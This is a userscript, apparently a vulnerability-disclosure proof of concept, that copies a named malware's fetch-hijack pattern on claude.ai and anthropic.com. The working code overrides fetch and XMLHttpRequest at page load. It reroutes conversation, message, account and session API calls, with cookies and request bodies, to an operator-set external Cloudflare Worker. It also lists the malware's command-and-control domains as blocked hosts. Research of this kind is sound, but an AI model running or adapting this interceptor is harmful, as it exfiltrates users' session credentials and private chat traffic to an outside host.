// ==UserScript==
// @name         Sister PoC — Fetch Interceptor (VDP Research)
// @namespace    sister-poc-vdp
// @version      1.0.0
// @description  Demonstrates CoCoDem's fetch-hijack pattern on claude.ai web surface.
//               Routes intercepted API calls to operator's own Worker C.
//               Single-operator VDP research artifact — not for distribution.
// @author       Operator (HackerOne VDP)
// @match        https://claude.ai/*
// @match        https://*.claude.ai/*
// @match        https://*.anthropic.com/*
// @match        http://localhost:*/*
// @match        http://127.0.0.1:*/*
// @grant        none
// @run-at       document-start
// @noframes     false
// ==/UserScript==

// ================================================================
// SISTER POC — TAMPERMONKEY FETCH INTERCEPTOR
// ================================================================
//
// PURPOSE:
//   This script demonstrates the EXACT SAME vulnerability pattern
//   that CoCoDem's request.js exploits in the Chrome extension:
//     globalThis.fetch override → route API calls through attacker infra
//
//   CoCoDem routes to: openclaude.111724.xyz (malware C2)
//   This script routes to: WORKER_C_URL (operator's own CF Worker)
//
//   The architectural thesis: if a userscript at page-context level
//   can override fetch() on claude.ai the same way request.js does
//   on the Chrome extension, the trust boundary is identical and the
//   vulnerability class applies to both surfaces.
//
// EVIDENCE:
//   Every intercepted request gets evidence headers:
//     x-wc-intercepted: true
//     x-wc-original-url: <where it would have gone>
//     x-wc-routed-to: <where it actually went>
//     x-wc-timestamp: <ISO timestamp>
//
// SAFETY:
//   - Operator configures WORKER_C_URL (their own infrastructure)
//   - No credential capture — credentials forwarded through operator's Worker C
//   - CoCoDem malware C2 domains are BLOCKED
//   - Evidence headers make interception visible, not hidden
//   - Single operator only — @match is scoped to operator's own browsing
//
// ================================================================

(function() {
  'use strict';

  // ── CONFIGURATION ───────────────────────────────────────────
  // Operator sets this to their own Worker C Cloudflare Worker URL.
  // If empty, the script is inert (no interception).
  const WORKER_C_URL = localStorage.getItem('sister_poc_worker_c_url') || '';

  // API paths to intercept — mirrors CoCoDem's proxyIncludes
  const INTERCEPT_PATHS = [
    '/api/organizations/',    // bootstrap, conversations, completion
    '/v1/messages',           // Anthropic API
    '/v1/chat/completions',   // OpenAI-compat
    '/api/account',           // profile
    '/api/bootstrap/',        // app start
    '/edge-api/',             // statsig
    '/v1/models',             // model list
    '/v1/code/',              // claude code
    '/v1/sessions',           // sessions
  ];

  // Paths to NOT intercept (let them go through normally)
  const PASSTHROUGH_PATHS = [
    '/api/event_logging',     // telemetry — let it go or sink
    '/v1/statsig/',           // feature flags
  ];

  // CoCoDem malware domains — BLOCK these, never forward
  const BLOCKED_HOSTS = new Set([
    'openclaude.111724.xyz',
    'cfc.aroic.workers.dev',
    '111724.xyz',
    'aroic.workers.dev',
  ]);

  // ── STATE ───────────────────────────────────────────────────
  let interceptCount = 0;
  let active = !!WORKER_C_URL;
  const originalFetch = globalThis.fetch;
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;

  // ── LOGGING ─────────────────────────────────────────────────
  const PREFIX = '[Sister PoC]';
  function log(...args) { console.log(PREFIX, ...args); }
  function warn(...args) { console.warn(PREFIX, ...args); }
  function debug(...args) { console.debug(PREFIX, ...args); }

  // ── HELPERS ─────────────────────────────────────────────────
  function isBlockedHost(hostname) {
    const h = hostname.toLowerCase();
    if (BLOCKED_HOSTS.has(h)) return true;
    for (const blocked of BLOCKED_HOSTS) {
      if (h.endsWith('.' + blocked)) return true;
    }
    return false;
  }

  function shouldIntercept(urlStr) {
    try {
      const u = new URL(urlStr, location.href);

      // Block CoCoDem C2
      if (isBlockedHost(u.hostname)) {
        warn('BLOCKED CoCoDem C2:', u.hostname);
        return { intercept: false, blocked: true };
      }

      // Check if this is an API path we care about
      const path = u.pathname;
      for (const pp of PASSTHROUGH_PATHS) {
        if (path.startsWith(pp)) return { intercept: false, blocked: false };
      }
      for (const ip of INTERCEPT_PATHS) {
        if (path.startsWith(ip) || path === ip) return { intercept: true, blocked: false };
      }

      return { intercept: false, blocked: false };
    } catch {
      return { intercept: false, blocked: false };
    }
  }

  function buildWorkerCUrl(originalUrl) {
    const u = new URL(originalUrl, location.href);
    const base = WORKER_C_URL.replace(/\/$/, '');
    // Forward the original path to Worker C — Worker C decides where to send it
    return base + u.pathname + u.search;
  }

  // ── FETCH OVERRIDE ──────────────────────────────────────────
  // This is the EXACT pattern CoCoDem's request.js uses:
  //   globalThis.__fetch = fetch;
  //   globalThis.fetch = function request(url, options) { ... }
  //
  // The difference: CoCoDem routes to openclaude.111724.xyz (malware C2)
  //                 This routes to WORKER_C_URL (operator's own CF Worker)

  globalThis.__fetch = originalFetch; // preserve original (same as CoCoDem)

  globalThis.fetch = async function interceptedFetch(input, init) {
    if (!active) return originalFetch.call(globalThis, input, init);

    // Resolve the URL
    let urlStr;
    if (typeof input === 'string') {
      urlStr = input;
    } else if (input instanceof Request) {
      urlStr = input.url;
    } else if (input instanceof URL) {
      urlStr = input.toString();
    } else {
      return originalFetch.call(globalThis, input, init);
    }

    const { intercept, blocked } = shouldIntercept(urlStr);

    if (blocked) {
      return new Response(JSON.stringify({
        type: 'error',
        error: { type: 'permission_error', message: 'CoCoDem C2 domain blocked by Sister PoC' },
      }), { status: 403, headers: { 'Content-Type': 'application/json' } });
    }

    if (!intercept) {
      return originalFetch.call(globalThis, input, init);
    }

    // ── INTERCEPT ───────────────────────────────────────────
    interceptCount++;
    const timestamp = new Date().toISOString();
    const workerCTarget = buildWorkerCUrl(urlStr);

    debug(`Intercepted [${interceptCount}]:`, urlStr, '→', workerCTarget);

    // Build forwarded request
    const headers = new Headers(init?.headers || {});
    if (input instanceof Request) {
      for (const [k, v] of input.headers.entries()) {
        if (!headers.has(k)) headers.set(k, v);
      }
    }

    // Evidence headers
    headers.set('x-wc-intercepted', 'true');
    headers.set('x-wc-original-url', urlStr);
    headers.set('x-wc-timestamp', timestamp);

    // Forward the request to Worker C
    const fetchInit = {
      method: init?.method || (input instanceof Request ? input.method : 'GET'),
      headers,
      credentials: 'include', // forward cookies for cookie_bridge auth mode
      redirect: 'follow',
    };

    // Forward body
    if (init?.body) {
      fetchInit.body = init.body;
    } else if (input instanceof Request && input.method !== 'GET' && input.method !== 'HEAD') {
      try { fetchInit.body = await input.clone().text(); } catch {}
    }

    try {
      const response = await originalFetch.call(globalThis, workerCTarget, fetchInit);

      debug(`Response [${interceptCount}]:`, response.status, response.headers.get('content-type'));

      return response;
    } catch (e) {
      warn(`Forward failed [${interceptCount}]:`, e.message);
      // Fall back to original fetch if Worker C is unreachable
      return originalFetch.call(globalThis, input, init);
    }
  };

  // ── XHR OVERRIDE ────────────────────────────────────────────
  // CoCoDem also hooks XMLHttpRequest.prototype.open
  // Same pattern, same purpose

  XMLHttpRequest.prototype.open = function interceptedXHROpen(method, url, ...args) {
    if (!active) return originalXHROpen.call(this, method, url, ...args);

    const urlStr = typeof url === 'string' ? url : url?.toString?.() || '';
    const { intercept, blocked } = shouldIntercept(urlStr);

    if (blocked) {
      this._blocked = true;
      return originalXHROpen.call(this, method, 'about:blank', ...args);
    }

    if (intercept) {
      const workerCTarget = buildWorkerCUrl(urlStr);
      this._intercepted = true;
      this._originalUrl = urlStr;
      debug(`XHR Intercepted: ${method} ${urlStr} → ${workerCTarget}`);
      return originalXHROpen.call(this, method, workerCTarget, ...args);
    }

    return originalXHROpen.call(this, method, url, ...args);
  };

  XMLHttpRequest.prototype.send = function interceptedXHRSend(body) {
    if (this._blocked) {
      // Don't send to CoCoDem C2
      warn('XHR blocked (CoCoDem C2)');
      return;
    }

    if (this._intercepted) {
      // Add evidence headers
      try {
        this.setRequestHeader('x-wc-intercepted', 'true');
        this.setRequestHeader('x-wc-original-url', this._originalUrl || '');
        this.setRequestHeader('x-wc-timestamp', new Date().toISOString());
      } catch {} // setRequestHeader can fail if state is wrong
    }

    return originalXHRSend.call(this, body);
  };

  // ── CONTROL API ─────────────────────────────────────────────
  // Operator can control the script from the browser console

  globalThis.__sisterPoc = {
    get status() {
      return {
        active,
        worker_c_url: WORKER_C_URL,
        intercept_count: interceptCount,
        intercept_paths: INTERCEPT_PATHS,
        blocked_hosts: [...BLOCKED_HOSTS],
      };
    },

    // Set Worker C URL
    setWorkerC(url) {
      localStorage.setItem('sister_poc_worker_c_url', url);
      log('Worker C URL set to:', url, '— reload page to activate');
    },

    // Enable/disable interception
    enable() { active = true; log('Interception ENABLED'); },
    disable() { active = false; log('Interception DISABLED'); },

    // Restore original fetch (clean teardown)
    restore() {
      globalThis.fetch = originalFetch;
      XMLHttpRequest.prototype.open = originalXHROpen;
      XMLHttpRequest.prototype.send = originalXHRSend;
      active = false;
      log('Original fetch/XHR restored. Interception fully disabled.');
    },

    // Test the connection to Worker C
    async testWorkerC() {
      if (!WORKER_C_URL) { warn('No Worker C URL configured'); return; }
      try {
        const resp = await originalFetch(WORKER_C_URL + '/health');
        const data = await resp.json();
        log('Worker C health:', data);
        return data;
      } catch (e) {
        warn('Worker C unreachable:', e.message);
      }
    },
  };

  // ── BOOT ────────────────────────────────────────────────────
  if (active) {
    log('ACTIVE — intercepting API calls');
    log('Worker C:', WORKER_C_URL);
    log('Intercept paths:', INTERCEPT_PATHS.length);
    log('Blocked hosts:', [...BLOCKED_HOSTS].join(', '));
    log('Control: __sisterPoc.status / .disable() / .restore()');
  } else {
    log('INACTIVE — no Worker C URL configured');
    log('Set one: __sisterPoc.setWorkerC("https://your-worker-c.workers.dev")');
    log('Then reload the page.');
  }

})();
